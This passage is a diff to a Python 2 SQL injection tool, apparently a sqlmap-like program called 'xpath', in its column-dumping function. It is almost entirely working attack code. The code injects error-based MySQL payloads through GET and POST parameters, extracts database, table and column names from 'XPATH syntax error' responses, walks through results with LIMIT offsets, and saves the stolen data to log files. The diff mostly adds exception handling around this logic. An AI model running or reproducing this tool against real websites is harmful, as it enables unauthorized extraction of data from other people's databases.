+                                                                while temp < noc:
+                                                                    if 'LIMIT/**_**/0' in DbDumpQuery:
+                                                                        tempQuery = DbDumpQuery.replace('LIMIT/**_**/0','LIMIT/**_**/%d' % temp)
+                                                                    elif 'LIMIT%20' in DbDumpQuery:
+                                                                        tempQuery = DbDumpQuery.replace('LIMIT%200','LIMIT%%20%d' % temp)
+                                                                    else:
+                                                                        tempQuery = DbDumpQuery.replace('LIMIT+0','LIMIT+%d' % temp)
+                                                                        
+                                                                    try:
+                                                                        req = Request(tempQuery, headers={'User-agent':ua})
+                                                                        resp = urlopen(req, timeout=10)
+                                                                    except URLError as e:
+                                                                        URLError()
+                                                                        if temp == 0:
+                                                                            temp = 0
+                                                                        else:
+                                                                            temp = temp
+                                                                        sleep(1)
+                                                                        pass
+                                                                    except HTTPError as e:
+    ##                                                                    print br + fw + sn + "["+strftime("%H:%M:%S")+"] [CRITICAL] %s | Resource %s "% (e.code, e.msg)
+                                                                        sleep(1)
+                                                                        pass
+                                                                    except (IOError, httplib.HTTPException) as e:
+                                                                        ConnTimeOut()
+                                                                        if temp == 0:
+                                                                            temp = 0
+                                                                        else:
+                                                                            temp = temp
+                                                                        sleep(1)
+                                                                        pass
+                                                                    except KeyboardInterrupt:
+                                                                        print fw + sn + "Database: %s" % db
+                                                                        print fw + sn + "Table: %s" % tbl
+                                                                        print fw + sn + "[Dumped "+str(temp)+" columns]"
+                                                                        #print fw + sn + tmp
+                                                                        col = pt(["columns"])
+                                                                        col.align = "l"
+                                                                        col.header = False
+                                                                        for cols in dumps:
+                                                                            col.add_row([cols])
+                                                                            pass
+                                                                        print fw + sn + str(col)
+                                                                        f.write(infos)
+                                                                        f.write(str(col)+"\n")
+                                                                        f.close()
+                                                                        print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] fetched data logged to text files under '%s'" % target
+                                                                        KeyBoardInterrupt()
+                                                                        break
+                                                                    else:
                                                                         try:
-                                                                            req = Request(FinalDumpQuery_replaced, headers={'User-agent':ua})
-                                                                            resp = urlopen(req, timeout=10)
-                                                                        except URLError as e:
-                                                                            URLError()
-                                                                            sleep(1)
+                                                                            respdata = resp.read()
+                                                                            name_of_cols = respdata.split("XPATH syntax error: '~")[1].split("'")[0]
+                                                                            if 'XPATH syntax error' in respdata:
+                                                                                print fg + sb + "["+strftime("%H:%M:%S")+"] [INFO] retrieved: %s" % name_of_cols
+                                                                                #infos += "[*] %s\n" % name_of_cols
+                                                                                #tmp += "[*] %s\n" % name_of_cols
+                                                                                dumps.append(name_of_cols)
+                                                                                temp += 1
+                                                                                
+                                                                        except IndexError as e:
                                                                             pass
-                                                                        except HTTPError as e:
-##                                                                            print br + fw + sn + "["+strftime("%H:%M:%S")+"] [CRITICAL] %s | Resource %s "% (e.code, e.msg)
-                                                                            sleep(1)
-                                                                            pass
-                                                                        except (IOError, httplib.HTTPException) as e:
-                                                                            ConnTimeOut()
+                                                                        except Exception as e:
+                                                                            #print '[-] %s' % e
+                                                                           # sys.exit(0)
                                                                             pass
                                                                         except KeyboardInterrupt:
                                                                             KeyBoardInterrupt()
                                                                             break
-                                                                        else:
-                                                                            try:
-                                                                                respdata = resp.read()
-                                                                                isTrue_dbs = respdata.split("XPATH syntax error: '~")[1].split("'")[0]
-                                                                                if 'XPATH syntax error' in respdata:
-                                                                                    dbvul = True
-                                                                                    DbDumpQuery = FinalDumpQuery_replaced
-                                                                                    temp = 0
-                                                                                    noc = int(no_of_cols)
-                                                                                    infos += "Database: %s\n" % db
-                                                                                    infos += "Table: %s\n" % tbl
-                                                                                    infos += "["+str(noc)+" columns]\n"
-                                                                                    #tmp = ""
-                                                                                    while temp < noc:
-                                                                                        if 'LIMIT/**_**/0' in DbDumpQuery:
-                                                                                            tempQuery = DbDumpQuery.replace('LIMIT/**_**/0','LIMIT/**_**/%d' % temp)
-                                                                                        elif 'LIMIT%20' in DbDumpQuery:
-                                                                                            tempQuery = DbDumpQuery.replace('LIMIT%200','LIMIT%%20%d' % temp)
-                                                                                        else:
-                                                                                            tempQuery = DbDumpQuery.replace('LIMIT+0','LIMIT+%d' % temp)
-
-                                                                                        try:
-                                                                                            req = Request(tempQuery, headers={'User-agent':ua})
-                                                                                            resp = urlopen(req, timeout=10)
-                                                                                        except URLError as e:
-                                                                                            URLError()
-                                                                                            if temp == 0:
-                                                                                                temp = 0
-                                                                                            else:
-                                                                                                temp = temp
-                                                                                            sleep(1)
-                                                                                            pass
-                                                                                        except HTTPError as e:
-##                                                                                            print br + fw + sn + "["+strftime("%H:%M:%S")+"] [CRITICAL] %s | Resource %s "% (e.code, e.msg)
-                                                                                            sleep(1)
-                                                                                            pass
-                                                                                        except (IOError, httplib.HTTPException) as e:
-                                                                                            ConnTimeOut()
-                                                                                            if temp == 0:
-                                                                                                temp = 0
-                                                                                            else:
-                                                                                                temp = temp
-                                                                                            pass
-                                                                                        except KeyboardInterrupt:
-                                                                                            print fg + sb + "Database: %s" % db
-                                                                                            print fg + sb + "Table: %s" % tbl
-                                                                                            print fg + sb + "[Dumped "+str(temp)+" columns]"
-                                                                                            #print fg + sb + tmp
-                                                                                            col = pt(["columns"])
-                                                                                            col.align = "l"
-                                                                                            col.header = False
-                                                                                            for cols in dumps:
-                                                                                                col.add_row([cols])
-                                                                                                pass
-                                                                                            print fg + sn + str(col)
-                                                                                            f.write(infos)
-                                                                                            f.write(str(col)+"\n")
-                                                                                            f.close()
-                                                                                            print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] fetched data logged to text files under '%s'" % target
-                                                                                            KeyBoardInterrupt()
-                                                                                            break
-                                                                                        else:
-                                                                                            try:
-                                                                                                respdata = resp.read()
-                                                                                                name_of_cols = respdata.split("XPATH syntax error: '~")[1].split("'")[0]
-                                                                                                if 'XPATH syntax error' in respdata:
-                                                                                                    print fg + sb + "["+strftime("%H:%M:%S")+"] [INFO] retrieved: %s" % name_of_cols
-                                                                                                    #infos += "[*] %s\n" % name_of_cols
-                                                                                                    #tmp += "[*] %s\n" % name_of_cols
-                                                                                                    dumps.append(name_of_cols)
-                                                                                                    temp += 1
-                                                                                                    
-                                                                                            except IndexError as e:
-                                                                                                pass
-                                                                                            except Exception as e:
-                                                                                                #print '[-] %s' % e
-                                                                                                #sys.exit(0)
-                                                                                                pass
-                                                                                            except KeyboardInterrupt:
-                                                                                                KeyBoardInterrupt()
-                                                                                                break
-                                                                                    print fg + sb + "Database: %s" % db
-                                                                                    print fg + sb + "Table: %s" % tbl
-                                                                                    print fg + sb + "["+str(noc)+" columns]"
-                                                                                    #print fg + sb + tmp
-                                                                                    col = pt(["columns"])
-                                                                                    col.align = "l"
-                                                                                    col.header = False
-                                                                                    for cols in dumps:
-                                                                                        col.add_row([cols])
-                                                                                        pass
-                                                                                    print fg + sn + str(col)
-                                                                                        
-                                                                            except IndexError as e:
-                                                                                pass
-                                                                            except Exception as e:
-                                                                                #print '[-] %s' % e
-                                                                                #sys.exit(0)
-                                                                                pass
-                                                                            except KeyboardInterrupt:
-                                                                                KeyBoardInterrupt()
-                                                                                break
-                                                                if dbvul:
-                                                                    break
-                                                    except IndexError as e:
-                                                        pass
-                                                    except Exception as e:
-                                                        #print '[-] %s' % e
-                                                        #sys.exit(0)
-                                                        pass
-                                                    except KeyboardInterrupt:
-                                                        KeyBoardInterrupt()
-                                                        break
-                                        if Query_Test:
-                                            break            
-                        if vul:
-                            break
-                    except (TypeError, IOError, IndexError):
-                        pass
-                    except KeyboardInterrupt:
-                        KeyBoardInterrupt()
-                        break
-                    
-            f.write(infos)
-            f.write(str(col)+"\n")
-            f.close()
-            print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] fetched data logged to text files under '%s'" % target
-            
-        else:
-            print fw + sn + "xpath resumed the following injection point(s) from stored session:"
-            infos += "\nxpath resumed the following injection point(s) from stored session:\n"
-            with open(logs, "r") as prev_session:
-                for line in islice(prev_session,1,7):
-                    out = line.rstrip()
-                    if out:
-                        print fw + sn + out
-                        infos += out+"\n"
-            prev_session.close()
-            Query_Test = False
-            tempfread = tempf.readline()
-            url = None
-            if wsr and war:
-                print fw + sn + "["+strftime("%H:%M:%S")+"] [INFO] web server technology: %s, %s" % (war, wsr)
-                infos += "web server technology: %s, %s\n" % (war, wsr)
-            else:
-                print fw + sn + "["+strftime("%H:%M:%S")+"] [INFO] web server technology: %s" % wsr
-                infos += "web server technology: %s\n" % wsr
-            print fw + sn + "["+strftime("%H:%M:%S")+"] [INFO] the back-end DBMS: MySQL"
-            infos += "the back-end DBMS: MySQL\n"
-            print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] fetching column names"
-            print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] fetching number of columns"
-            for QueryIndex in COL_COUNT_FROM_TBL:
-                if not Query_Test:
-                    QueryToTest = QueryIndex % (db.encode('hex','strict'),tbl.encode('hex','strict'))
-                    if '0x72306f74' in tempfread:
-                        FinalCountQuery_replaced = tempfread.replace('0x72306f74', QueryToTest)
-                        try:
-                            req = Request(FinalCountQuery_replaced, headers={'User-agent':ua})
-                            resp = urlopen(req, timeout=10)
-                        except URLError as e:
-                            URLError()
-                            sleep(1)
-                            pass
-                        except HTTPError as e:
-##                            print br + fw + sn + "["+strftime("%H:%M:%S")+"] [CRITICAL] %s | Resource %s "% (e.code, e.msg)
-                            sleep(1)
-                            pass
-                        except (IOError, httplib.HTTPException) as e:
-                            ConnTimeOut()
-                            pass
-                        except KeyboardInterrupt:
-                            KeyBoardInterrupt()
-                            break
-                        else:
-                            try:
-                                respdata = resp.read()
-                                no_of_cols = respdata.split("XPATH syntax error: '~")[1].split("'")[0]
-                                if 'XPATH syntax error' in respdata:
-                                    Query_Test = True
-                                    QueryToDumpDbNames = FinalCountQuery_replaced
-                                    print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] the SQL query used returns %s entries" % no_of_cols
-                                    dbvul = False
-                                    for QueryIndex in COL_DUMP_FROM_TBL:
-                                        if not dbvul:
-                                            QueryToTest = QueryIndex % (db.encode('hex','strict'),tbl.encode('hex','strict'))
-                                            if '0x72306f74' in tempfread:
-                                                FinalCountQuery_replaced = tempfread.replace('0x72306f74', QueryToTest)
-                                                try:
-                                                    req = Request(FinalCountQuery_replaced, headers={'User-agent':ua})
-                                                    resp = urlopen(req, timeout=10)
-                                                except URLError as e:
-                                                    URLError()
-                                                    sleep(1)
-                                                    pass
-                                                except HTTPError as e:
-##                                                    print br + fw + sn + "["+strftime("%H:%M:%S")+"] [CRITICAL] %s | Resource %s "% (e.code, e.msg)
-                                                    sleep(1)
-                                                    pass
-                                                except (IOError, httplib.HTTPException) as e:
-                                                    ConnTimeOut()
-                                                    pass
-                                                except KeyboardInterrupt:
-                                                    KeyBoardInterrupt()
-                                                    break
-                                                else:
-                                                    try:
-                                                        respdata = resp.read()
-                                                        isTrue_dbs = respdata.split("XPATH syntax error: '~")[1].split("'")[0]
-                                                        if 'XPATH syntax error' in respdata:
-                                                            dbvul = True
-                                                            DbDumpQuery = FinalCountQuery_replaced
-                                                            temp = 0
-                                                            noc = int(no_of_cols)
-                                                            infos += "Database: %s\n" % db
-                                                            infos += "Table: %s\n" % tbl
-                                                            infos += "["+str(noc)+" columns]\n"
-                                                            #tmp = ""
-                                                            while temp < noc:
-                                                                if 'LIMIT/**_**/0' in DbDumpQuery:
-                                                                    tempQuery = DbDumpQuery.replace('LIMIT/**_**/0','LIMIT/**_**/%d' % temp)
-                                                                elif 'LIMIT%20' in DbDumpQuery:
-                                                                    tempQuery = DbDumpQuery.replace('LIMIT%200','LIMIT%%20%d' % temp)
-                                                                else:
-                                                                    tempQuery = DbDumpQuery.replace('LIMIT+0','LIMIT+%d' % temp)
+                                                                print fw + sn + "Database: %s" % db
+                                                                print fw + sn + "Table: %s" % tbl
+                                                                print fw + sn + "["+str(noc)+" columns]"
+                                                                #print fw + sn + tmp
+                                                                col = pt(["columns"])
+                                                                col.align = "l"
+                                                                col.header = False
+                                                                for cols in dumps:
+                                                                    col.add_row([cols])
+                                                                    pass
+                                                                print fw + sn + str(col)
                                                                     
-                                                                try:
-                                                                    req = Request(tempQuery, headers={'User-agent':ua})
-                                                                    resp = urlopen(req, timeout=10)
-                                                                except URLError as e:
-                                                                    URLError()
-                                                                    if temp == 0:
-                                                                        temp = 0
-                                                                    else:
-                                                                        temp = temp
-                                                                    sleep(1)
-                                                                    pass
-                                                                except HTTPError as e:
-##                                                                    print br + fw + sn + "["+strftime("%H:%M:%S")+"] [CRITICAL] %s | Resource %s "% (e.code, e.msg)
-                                                                    sleep(1)
-                                                                    pass
-                                                                except (IOError, httplib.HTTPException) as e:
-                                                                    ConnTimeOut()
-                                                                    if temp == 0:
-                                                                        temp = 0
-                                                                    else:
-                                                                        temp = temp
-                                                                    sleep(1)
-                                                                    pass
-                                                                except KeyboardInterrupt:
-                                                                    print fw + sn + "Database: %s" % db
-                                                                    print fw + sn + "Table: %s" % tbl
-                                                                    print fw + sn + "[Dumped "+str(temp)+" columns]"
-                                                                    #print fw + sn + tmp
-                                                                    col = pt(["columns"])
-                                                                    col.align = "l"
-                                                                    col.header = False
-                                                                    for cols in dumps:
-                                                                        col.add_row([cols])
-                                                                        pass
-                                                                    print fw + sn + str(col)
-                                                                    f.write(infos)
-                                                                    f.write(str(col)+"\n")
-                                                                    f.close()
-                                                                    print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] fetched data logged to text files under '%s'" % target
-                                                                    KeyBoardInterrupt()
-                                                                    break
-                                                                else:
-                                                                    try:
-                                                                        respdata = resp.read()
-                                                                        name_of_cols = respdata.split("XPATH syntax error: '~")[1].split("'")[0]
-                                                                        if 'XPATH syntax error' in respdata:
-                                                                            print fg + sb + "["+strftime("%H:%M:%S")+"] [INFO] retrieved: %s" % name_of_cols
-                                                                            #infos += "[*] %s\n" % name_of_cols
-                                                                            #tmp += "[*] %s\n" % name_of_cols
-                                                                            dumps.append(name_of_cols)
-                                                                            temp += 1
-                                                                            
-                                                                    except IndexError as e:
-                                                                        pass
-                                                                    except Exception as e:
-                                                                        #print '[-] %s' % e
-                                                                       # sys.exit(0)
-                                                                        pass
-                                                                    except KeyboardInterrupt:
-                                                                        KeyBoardInterrupt()
-                                                                        break
-                                                            print fw + sn + "Database: %s" % db
-                                                            print fw + sn + "Table: %s" % tbl
-                                                            print fw + sn + "["+str(noc)+" columns]"
-                                                            #print fw + sn + tmp
-                                                            col = pt(["columns"])
-                                                            col.align = "l"
-                                                            col.header = False
-                                                            for cols in dumps:
-                                                                col.add_row([cols])
-                                                                pass
-                                                            print fw + sn + str(col)
-                                                                
-                                                    except IndexError as e:
-                                                        pass
-                                                    except Exception as e:
-                                                        #print '[-] %s' % e
-                                                        #sys.exit(0)
-                                                        pass
-                                                    except KeyboardInterrupt:
-                                                        KeyBoardInterrupt()
-                                                        break
-                                        if dbvul:
-                                            break
-                                        # TBL DUMP END
-                            except IndexError as e:
-                                pass
-                            except Exception as e:
-                                #print '[-] %s' % e
-                                #sys.exit(0)
-                                pass
-                            except KeyboardInterrupt:
-                                KeyBoardInterrupt()
-                                break
-                if Query_Test:
-                    break
-            tempf.close()
-            f.write(infos)
-            f.write(str(col)+"\n")
-            f.close()
-            print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] fetched data logged to text files under '%s'" % target
-            infos = ""
+                                                        except IndexError as e:
+                                                            pass
+                                                        except Exception as e:
+                                                            #print '[-] %s' % e
+                                                            #sys.exit(0)
+                                                            pass
+                                                        except KeyboardInterrupt:
+                                                            KeyBoardInterrupt()
+                                                            break
+                                            if dbvul:
+                                                break
+                                            # TBL DUMP END
+                                except IndexError as e:
+                                    pass
+                                except Exception as e:
+                                    #print '[-] %s' % e
+                                    #sys.exit(0)
+                                    pass
+                                except KeyboardInterrupt:
+                                    KeyBoardInterrupt()
+                                    break
+                    if Query_Test:
+                        break
+                tempf.close()
+                f.write(infos)
+                f.write(str(col)+"\n")
+                f.close()
+                print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] fetched data logged to text files under '%s'" % target
+                infos = ""
+            except Exception as e:
+                print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] fetched data logged to text files under '%s'" % target
+                pass
 #--------------------------------------------------------------------------------
 #                           POST DATA
 #--------------------------------------------------------------------------------
@@ -4293,29 +4350,313 @@ def dumpCols(url, data, db, tbl):
         try:
             tempf = open(payload,'r')
         except (Exception, IOError) as e:
-            if 'No such file or directory' in e:
-                vul = False
-                for prefix, query, sufix, inline_comment in product(PREFIXES, TESTS, SUFIXES, (False, True)):
-                    try:
-                        if not vul:
-                            temp = ("%s%s%s" % (prefix, query, sufix)).replace(" " if inline_comment else "/**/","/**/")
-                            if '*' in data:
-                                first, last = data.split('*')
-                                tgt = first + temp + last
-                                #print fc + sn + "["+strftime("%H:%M:%S")+"] [INFO] testing injection on user define parameter: (POST)" 
-                            else:
-                                tgt = data + temp
+            try:
+                if 'No such file or directory' in e:
+                    vul = False
+                    for prefix, query, sufix, inline_comment in product(PREFIXES, TESTS, SUFIXES, (False, True)):
+                        try:
+                            if not vul:
+                                temp = ("%s%s%s" % (prefix, query, sufix)).replace(" " if inline_comment else "/**/","/**/")
+                                if '*' in data:
+                                    first, last = data.split('*')
+                                    tgt = first + temp + last
+                                    #print fc + sn + "["+strftime("%H:%M:%S")+"] [INFO] testing injection on user define parameter: (POST)" 
+                                else:
+                                    tgt = data + temp
+                                try:
+                                    print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] testing '"+ fg + sn + test + fg + sn + "'"
+                                    req = Request(url, data=tgt, headers={'User-agent':ua})
+                                    HTTPReqCount += 1
+                                    resp = urlopen(req, timeout=10)
+                                except URLError as e:
+                                    URLError()
+                                    sleep(1)
+                                    pass
+                                except HTTPError as e:
+    ##                                print br + fw + sn + "["+strftime("%H:%M:%S")+"] [CRITICAL] %s | Resource %s "% (e.code, e.msg)
+                                    sleep(1)
+                                    pass
+                                except (IOError, httplib.HTTPException) as e:
+                                    ConnTimeOut()
+                                    pass
+                                except KeyboardInterrupt:
+                                    KeyBoardInterrupt()
+                                    break   
+                                else:
+                                    try:
+                                        respdata = resp.read()
+                                        retVal = respdata.split("XPATH syntax error: '~")[1].split("'")[0]
+                                        if 'XPATH syntax error' in respdata:
+                                            vul = True
+                                            print fg + sb + 'xpath identified the following injection point(s) with a total of %d HTTP(s) requests:' % HTTPReqCount
+                                            infos += 'xpath identified the following injection point(s) with a total of %d HTTP(s) requests:\n' % HTTPReqCount
+                                            print fw + sn + '---'
+                                            infos += '---\n'
+                                            print fw + sn + 'Parameter: (GET)'
+                                            infos += 'Parameter: (GET)\n'
+                                            print fw + sn + '\tType: error-based'
+                                            infos += '\tType: error-based\n'
+                                            print fw + sn + '\tTitle: %s' % test
+                                            infos += '\tTitle: %s\n' % test
+                                            print fw + sn + '\tPayload: %s' % tgt
+                                            infos += '\tPayload: %s\n' % tgt
+                                            # ----------------------------------------
+                                            # for later usage of dumiping other things
+                                            CreatePayloadFile()
+                                            with open(payload,'w') as ft:
+                                                ft.write('%s' % tgt)
+                                                ft.close()
+                                            # ----------------------------------------
+                                            print fw + sn + '---'
+                                            infos += '---\n'
+                                        
+                                    except IndexError as e:
+                                        pass
+                                    except Exception as e:
+                                        #print '[-] %s' % e
+                                        pass
+                                    except KeyboardInterrupt:
+                                        KeyBoardInterrupt()
+                                        break
+                                    else:
+                                        Query_Test = False
+                                        if wsr and war:
+                                            print fw + sn + "["+strftime("%H:%M:%S")+"] [INFO] web server technology: %s, %s" % (war, wsr)
+                                            infos += "web server technology: %s, %s\n" % (war, wsr)
+                                        else:
+                                            print fw + sn + "["+strftime("%H:%M:%S")+"] [INFO] web server technology: %s" % wsr
+                                            infos += "web server technology: %s\n" % wsr
+                                        print fw + sn + "["+strftime("%H:%M:%S")+"] [INFO] the back-end DBMS: MySQL"
+                                        infos += "the back-end DBMS: MySQL\n"
+                                        print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] fetching column names"
+                                        print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] fetching number of columns"
+                                        for QueryIndex in COL_COUNT_FROM_TBL:
+                                            if not Query_Test:
+                                                QueryToTest = QueryIndex % (db.encode('hex','strict'), tbl.encode('hex','strict'))
+                                                if '0x72306f74' in tgt:
+                                                    FinalCountQuery_replaced = tgt.replace('0x72306f74', QueryToTest)
+                                                    try:
+                                                        req = Request(url, data=FinalCountQuery_replaced, headers={'User-agent':ua})
+                                                        resp = urlopen(req, timeout=10)
+                                                    except URLError as e:
+                                                        URLError()
+                                                        sleep(1)
+                                                        pass
+                                                    except HTTPError as e:
+    ##                                                    print br + fw + sn + "["+strftime("%H:%M:%S")+"] [CRITICAL] %s | Resource %s "% (e.code, e.msg)
+                                                        sleep(1)
+                                                        pass
+                                                    except (IOError, httplib.HTTPException) as e:
+                                                        ConnTimeOut()
+                                                        pass
+                                                    except KeyboardInterrupt:
+                                                        KeyBoardInterrupt()
+                                                        break
+                                                    else:
+                                                        try:
+                                                            respdata = resp.read()
+                                                            no_of_cols = respdata.split("XPATH syntax error: '~")[1].split("'")[0]
+                                                            if 'XPATH syntax error' in respdata:
+                                                                Query_Test = True
+                                                                #print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] the SQL query used returns %s entries" % no_of_cols
+                                                                if '0' in no_of_cols:
+                                                                    print fr + sn + "["+strftime("%H:%M:%S")+"] [INFO] the SQL query used returns %s entries" % no_of_cols
+                                                                    break
+                                                                else:
+                                                                    print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] the SQL query used returns %s entries" % no_of_cols
+                                                                dbvul = False
+                                                                for QueryIndex in COL_DUMP_FROM_TBL:
+                                                                    if not dbvul:
+                                                                        QueryToTest = QueryIndex % (db.encode('hex','strict'), tbl.encode('hex', 'strict'))
+                                                                        if '0x72306f74' in tgt:
+                                                                            FinalDumpQuery_replaced = tgt.replace('0x72306f74', QueryToTest)
+                                                                            try:
+                                                                                req = Request(url, data=FinalDumpQuery_replaced, headers={'User-agent':ua})
+                                                                                resp = urlopen(req, timeout=10)
+                                                                            except URLError as e:
+                                                                                URLError()
+                                                                                sleep(1)
+                                                                                pass
+                                                                            except HTTPError as e:
+                                                                                print br + fw + sn + "["+strftime("%H:%M:%S")+"] [CRITICAL] %s | Resource %s "% (e.code, e.msg)
+                                                                                sleep(1)
+                                                                                pass
+                                                                            except (IOError, httplib.HTTPException) as e:
+                                                                                ConnTimeOut()
+                                                                                pass
+                                                                            except KeyboardInterrupt:
+                                                                                KeyBoardInterrupt()
+                                                                                break
+                                                                            else:
+                                                                                try:
+                                                                                    respdata = resp.read()
+                                                                                    isTrue_dbs = respdata.split("XPATH syntax error: '~")[1].split("'")[0]
+                                                                                    if 'XPATH syntax error' in respdata:
+                                                                                        dbvul = True
+                                                                                        DbDumpQuery = FinalDumpQuery_replaced
+                                                                                        temp = 0
+                                                                                        noc = int(no_of_cols)
+                                                                                        infos += "Database: %s\n" % db
+                                                                                        infos += "Table: %s\n" % tbl
+                                                                                        infos += "["+str(noc)+" columns]\n"
+                                                                                        #tmp = ""
+                                                                                        while temp < noc:
+                                                                                            if 'LIMIT/**_**/0' in DbDumpQuery:
+                                                                                                tempQuery = DbDumpQuery.replace('LIMIT/**_**/0','LIMIT/**_**/%d' % temp)
+                                                                                            elif 'LIMIT%20' in DbDumpQuery:
+                                                                                                tempQuery = DbDumpQuery.replace('LIMIT%200','LIMIT%%20%d' % temp)
+                                                                                            else:
+                                                                                                tempQuery = DbDumpQuery.replace('LIMIT+0','LIMIT+%d' % temp)
+
+                                                                                            try:
+                                                                                                req = Request(url, data=tempQuery, headers={'User-agent':ua})
+                                                                                                resp = urlopen(req, timeout=10)
+                                                                                            except URLError as e:
+                                                                                                URLError()
+                                                                                                if temp == 0:
+                                                                                                    temp = 0
+                                                                                                else:
+                                                                                                    temp = temp
+                                                                                                sleep(1)
+                                                                                                pass
+                                                                                            except HTTPError as e:
+    ##                                                                                            print br + fw + sn + "["+strftime("%H:%M:%S")+"] [CRITICAL] %s | Resource %s "% (e.code, e.msg)
+                                                                                                sleep(1)
+                                                                                                pass
+                                                                                            except (IOError, httplib.HTTPException) as e:
+                                                                                                ConnTimeOut()
+                                                                                                if temp == 0:
+                                                                                                    temp = 0
+                                                                                                else:
+                                                                                                    temp = temp
+                                                                                                pass
+                                                                                            except KeyboardInterrupt:
+                                                                                                print fg + sb + "Database: %s" % db
+                                                                                                print fg + sb + "Table: %s" % tbl
+                                                                                                print fg + sb + "[Dumped "+str(temp)+" columns]"
+                                                                                                #print fg + sb + tmp
+                                                                                                col = pt(["columns"])
+                                                                                                col.align = "l"
+                                                                                                col.header = False
+                                                                                                for cols in dumps:
+                                                                                                    col.add_row([cols])
+                                                                                                    pass
+                                                                                                print fg + sn + str(col)
+                                                                                                f.write(infos)
+                                                                                                f.write(str(col)+"\n")
+                                                                                                f.close()
+                                                                                                print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] fetched data logged to text files under '%s'" % target
+                                                                                                KeyBoardInterrupt()
+                                                                                                break
+                                                                                            else:
+                                                                                                try:
+                                                                                                    respdata = resp.read()
+                                                                                                    name_of_cols = respdata.split("XPATH syntax error: '~")[1].split("'")[0]
+                                                                                                    if 'XPATH syntax error' in respdata:
+                                                                                                        print fg + sb + "["+strftime("%H:%M:%S")+"] [INFO] retrieved: %s" % name_of_cols
+                                                                                                        #infos += "[*] %s\n" % name_of_cols
+                                                                                                        #tmp += "[*] %s\n" % name_of_cols
+                                                                                                        dumps.append(name_of_cols)
+                                                                                                        temp += 1
+                                                                                                        
+                                                                                                except IndexError as e:
+                                                                                                    pass
+                                                                                                except Exception as e:
+                                                                                                    #print '[-] %s' % e
+                                                                                                    #sys.exit(0)
+                                                                                                    pass
+                                                                                                except KeyboardInterrupt:
+                                                                                                    KeyBoardInterrupt()
+                                                                                                    break
+                                                                                        print fg + sb + "Database: %s" % db        
+                                                                                        print fg + sb + "Table: %s" % tbl
+                                                                                        print fg + sb + "["+str(noc)+" columns]"
+                                                                                        #print fg + sb + tmp
+                                                                                        col = pt(["columns"])
+                                                                                        col.align = "l"
+                                                                                        col.header = False
+                                                                                        for cols in dumps:
+                                                                                            col.add_row([cols])
+                                                                                            pass
+                                                                                        print fg + sn + str(col)
+                                                                                            
+                                                                                except IndexError as e:
+                                                                                    pass
+                                                                                except Exception as e:
+                                                                                    #print '[-] %s' % e
+                                                                                    #sys.exit(0)
+                                                                                    pass
+                                                                                except KeyboardInterrupt:
+                                                                                    KeyBoardInterrupt()
+                                                                                    break
+                                                                    if dbvul:
+                                                                        break
+                                                        except IndexError as e:
+                                                            pass
+                                                        except Exception as e:
+                                                            #print '[-] %s' % e
+                                                            #sys.exit(0)
+                                                            pass
+                                                        except KeyboardInterrupt:
+                                                            KeyBoardInterrupt()
+                                                            break
+                                            if Query_Test:
+                                                break            
+                            if vul:
+                                break
+                        except (TypeError, IOError, IndexError):
+                            pass
+                        except KeyboardInterrupt:
+                            KeyBoardInterrupt()
+                            break
+                        
+                f.write(infos)
+                f.write(str(col)+"\n")
+                f.close()
+                print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] fetched data logged to text files under '%s'" % target
+            except Exception as e:
+                print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] fetched data logged to text files under '%s'" % target
+                pass
+            
+        else:
+            try:
+                print fw + sn + "xpath resumed the following injection point(s) from stored session:"
+                infos += "\nxpath resumed the following injection point(s) from stored session:\n"
+                with open(logs, "r") as prev_session:
+                    for line in islice(prev_session,1,7):
+                        out = line.rstrip()
+                        if out:
+                            print fw + sn + out
+                            infos += out+"\n"
+                prev_session.close()
+                HTTPResponses(url, data)
+                Query_Test = False
+                tempfread = tempf.readline()
+                if wsr and war:
+                    print fw + sn + "["+strftime("%H:%M:%S")+"] [INFO] web server technology: %s, %s" % (war, wsr)
+                    infos += "web server technology: %s, %s\n" % (war, wsr)
+                else:
+                    print fw + sn + "["+strftime("%H:%M:%S")+"] [INFO] web server technology: %s" % wsr
+                    infos += "web server technology: %s\n" % wsr
+                print fw + sn + "["+strftime("%H:%M:%S")+"] [INFO] the back-end DBMS: MySQL"
+                infos += "the back-end DBMS: MySQL\n"
+                print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] fetching column names"
+                print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] fetching number of columns"
+                for QueryIndex in COL_COUNT_FROM_TBL:
+                    if not Query_Test:
+                       #QueryToTest = ('%s' % QueryIndex).replace(" " if inline_comment else "/**/","/**/")
+                        QueryToTest = QueryIndex % (db.encode('hex','strict'), tbl.encode('hex', 'strict'))
+                        if '0x72306f74' in tempfread:
+                            FinalCountQuery_replaced = tempfread.replace('0x72306f74', QueryToTest)
                             try:
-                                print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] testing '"+ fg + sn + test + fg + sn + "'"
-                                req = Request(url, data=tgt, headers={'User-agent':ua})
-                                HTTPReqCount += 1
+                                req = Request(url, data=FinalCountQuery_replaced, headers={'User-agent':ua})
                                 resp = urlopen(req, timeout=10)
                             except URLError as e:
                                 URLError()
                                 sleep(1)
                                 pass
                             except HTTPError as e:
-##                                print br + fw + sn + "["+strftime("%H:%M:%S")+"] [CRITICAL] %s | Resource %s "% (e.code, e.msg)
+    ##                            print br + fw + sn + "["+strftime("%H:%M:%S")+"] [CRITICAL] %s | Resource %s "% (e.code, e.msg)
                                 sleep(1)
                                 pass
                             except (IOError, httplib.HTTPException) as e:
@@ -4323,434 +4664,168 @@ def dumpCols(url, data, db, tbl):
                                 pass
                             except KeyboardInterrupt:
                                 KeyBoardInterrupt()
-                                break   
+                                break
                             else:
                                 try:
                                     respdata = resp.read()
